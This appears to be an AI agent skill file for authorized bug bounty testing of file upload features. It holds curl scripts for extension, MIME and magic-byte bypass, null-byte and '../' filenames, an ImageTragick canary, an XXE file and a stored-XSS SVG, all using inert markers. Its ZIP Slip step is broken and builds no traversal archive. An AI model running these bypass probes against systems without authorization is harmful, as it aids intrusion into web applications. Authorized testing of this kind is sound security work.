---
name: bug-bounty-file-upload
description: Use for file upload vulnerability testing: extension bypass, MIME type validation, magic byte checks, filename manipulation, path traversal via upload, and malicious file processing.
---

# Bug Bounty File Upload Testing

Use this skill when file upload functionality is discovered (images, documents, avatars, exports, imports). **Requires explicit authorization** — malicious file testing can trip WAFs/EDR, land in production storage, or get forwarded to internal review pipelines.

## Safety Rules

- Confirm the upload endpoint is in scope before testing; treat any endpoint touching production storage, CDNs, or third-party processors (e.g. malware-scanning services) as higher risk.
- Never upload real malware, weaponized shells, or working reverse-shell payloads. Use inert markers (`UPLOAD_TEST`, harmless SSTI/XXE canaries) that prove the flaw without granting execution.
- Ask for approval before any test that could persist a file publicly, trigger downstream automation (email/image pipelines), or touch archive extraction on shared infrastructure (ZIP Slip).
- Clean up every test file you can reach immediately after confirming the result; log what you could not remove.
- Never target real user-uploaded content or overwrite existing files.

## Upload Discovery

```bash
target="example.com"
slug="$(printf '%s' "$target" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9._-]/_/g')"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"

# Find upload endpoints
endpoints=(
    "/upload"
    "/api/upload"
    "/api/v1/files"
    "/files/upload"
    "/profile/avatar"
    "/settings/photo"
    "/import"
    "/export"
    "/attachments"
)

for endpoint in "${endpoints[@]}"; do
    curl -sk -X OPTIONS "https://$target$endpoint" | \
        grep -i "allow\|post\|put" && \
        echo "Upload endpoint: $endpoint" >> "$BB_ROOT/api/upload-endpoints.txt"
done
```

## Extension Bypass Testing

```bash
# Create test files
echo "<?php echo 'UPLOAD_TEST'; ?>" > /tmp/test.php
echo "GIF89a; <?php echo 'UPLOAD_TEST'; ?>" > /tmp/test.gif.php  # Polyglot

# Test extensions
extensions=(
    ".php" ".php5" ".phtml" ".php3" ".phps" ".phar"
    ".asp" ".aspx" ".ashx" ".asmx"
    ".jsp" ".jspx"
    ".cgi"
    ".pl"
    ".py"
    ".exe" ".bat" ".sh"
    ".html" ".htm"
    ".svg"  # XSS vector
    ".xml"  # XXE vector
)

for ext in "${extensions[@]}"; do
    echo "<?php echo 'UPLOAD_TEST'; ?>" > "/tmp/test$ext"
    response=$(curl -sk -X POST "https://$target/upload" \
        -F "file=@/tmp/test$ext" \
        -F "submit=Upload" 2>/dev/null)
    
    echo "$response" | grep -qi "success\|uploaded\|complete" && \
        echo "ACCEPTED: $ext" >> "$BB_ROOT/vulns/upload-extension-bypass.txt"
done
```

## MIME Type Bypass

```bash
# Test MIME type validation
echo "<?php echo 'UPLOAD_TEST'; ?>" > /tmp/test.php

# Wrong MIME type (PHP file as image)
curl -sk -X POST "https://$target/upload" \
    -F "file=@/tmp/test.php;type=image/jpeg" \
    -F "submit=Upload"

# Correct MIME type but wrong extension
echo "GIF89a" > /tmp/test.gif
curl -sk -X POST "https://$target/upload" \
    -F "file=@/tmp/test.gif;type=application/x-php" \
    -F "submit=Upload"
```

## Magic Byte Bypass

```bash
# GIF magic bytes + PHP payload
printf 'GIF89a\x00\x00\x00\x00\x00\x00\x00<?php echo "UPLOAD_TEST"; ?>' > /tmp/test_polyglot.gif

curl -sk -X POST "https://$target/upload" \
    -F "file=@/tmp/test_polyglot.gif" \
    -F "submit=Upload"
```

## Filename Manipulation

```bash
# Test filename handling
filenames=(
    "test.php.jpg"      # Double extension
    "test%00.jpg"       # Null byte
    "test.php%20"       # Space encoding
    "test.php."         # Trailing dot
    "test.php   "       # Trailing spaces
    "test%2e%70%68%70"  # Full URL encoding
    "../../../test.php" # Path traversal
)

for filename in "${filenames[@]}"; do
    echo "<?php echo 'UPLOAD_TEST'; ?>" > "/tmp/test.php"
    curl -sk -X POST "https://$target/upload" \
        -F "file=@/tmp/test.php;filename=$filename" \
        -F "submit=Upload"
done
```

## Path Traversal via Upload

```bash
# Test if uploaded files are stored in predictable paths
paths=(
    "/uploads/"
    "/files/"
    "/images/"
    "/avatars/"
    "/attachments/"
    "../uploads/"
    "../../uploads/"
)

for path in "${paths[@]}"; do
    curl -sk "https://$target${path}test.php" | \
        grep -i "UPLOAD_TEST" && \
        echo "File accessible at: ${path}test.php" >> "$BB_ROOT/vulns/upload-path-traversal.txt"
done
```

## Image Processing Vulnerabilities

```bash
# Test image libraries (ImageMagick, GD, etc.)
# ImageTragick payload (SAFE version - just detection)
cat > /tmp/imagetragick_test.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://YOUR-CANARY.example/test.jpg)'
pop graphic-context
EOF

curl -sk -X POST "https://$target/upload" \
    -F "file=@/tmp/imagetragick_test.mvg" \
    -F "submit=Upload"

# Check for outbound connection in logs (requires monitoring)
```

## XXE via File Upload

```bash
# Test XML file uploads (XXE)
cat > /tmp/xxe_test.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe "XXE_TEST_MARKER">
]>
<root>&xxe;</root>
EOF

curl -sk -X POST "https://$target/upload" \
    -F "file=@/tmp/xxe_test.xml" \
    -F "submit=Upload" | \
    grep -i "XXE_TEST" && echo "XXE DETECTED" >> "$BB_ROOT/vulns/upload-xxe.txt"
```

## SVG Upload (XSS Vector)

```bash
# Test SVG upload (stored XSS)
cat > /tmp/xss_test.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('SVG_XSS_TEST')</script>
</svg>
EOF

curl -sk -X POST "https://$target/upload" \
    -F "file=@/tmp/xss_test.svg" \
    -F "submit=Upload"

# If accepted, can lead to stored XSS when viewed
```

## ZIP Slip (Archive Extraction)

```bash
# Create malicious ZIP with path traversal
mkdir -p /tmp/zip_test
# NOTE: ZIP slip test — use safe contained paths only
echo "TEST_CONTENT" > "$BB_ROOT/vulns/zip-slip-test-payload.txt"
cd /tmp/zip_test && zip -r ../malicious.zip .

curl -sk -X POST "https://$target/import" \
    -F "file=@/tmp/malicious.zip" \
    -F "submit=Import"

# Check if files extracted outside intended directory
```

## File Upload Checklist

- [ ] Extension validation (whitelist, not blacklist)
- [ ] MIME type validation (server-side, not client)
- [ ] Magic byte verification
- [ ] Filename sanitization
- [ ] Storage in non-web-accessible directory
- [ ] Randomized filenames on storage
- [ ] File size limits
- [ ] Image reprocessing (strip metadata)
- [ ] Content-Type header validation
- [ ] Path traversal protection
- [ ] Archive extraction safety (ZIP Slip)
- [ ] No dangerous file types allowed

## Upload Tools

- `burpsuite` - Upload interception/modification
- `ffuf` - Upload endpoint discovery
- `gobuster` - Directory discovery
- `nuclei` - Upload vulnerability templates
- Custom scripts for bypass testing

## Reporting Upload Vulns

| Severity | Finding |
|----------|---------|
| **Critical** | PHP/ASPX upload with execution |
| **Critical** | Path traversal via upload |
| **High** | SVG upload (stored XSS) |
| **High** | XXE via XML upload |
| **High** | Extension bypass possible |
| **Medium** | Missing MIME validation |
| **Medium** | No file size limits |
| **Low** | Verbose error messages |

## Output Convention

All commands must save output to organized paths:

```bash
ts="$(date +%Y%m%d-%H%M%S)"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"
# stdout -> $BB_ROOT/vulns/upload-<test>-$ts.txt
# stderr -> $BB_ROOT/logs/upload-<test>-$ts.err
```

Never dump raw tool output into chat context. Save to files, then read targeted excerpts.

## Quick-Reference Testing Rules

1. **NEVER** upload actual malware/shells — inert markers only.
2. **NEVER** upload to production without approval.
3. **ALWAYS** use safe test markers (`UPLOAD_TEST`, not real code).
4. **ALWAYS** clean up test files after testing.
5. **DOCUMENT** all upload attempts and responses.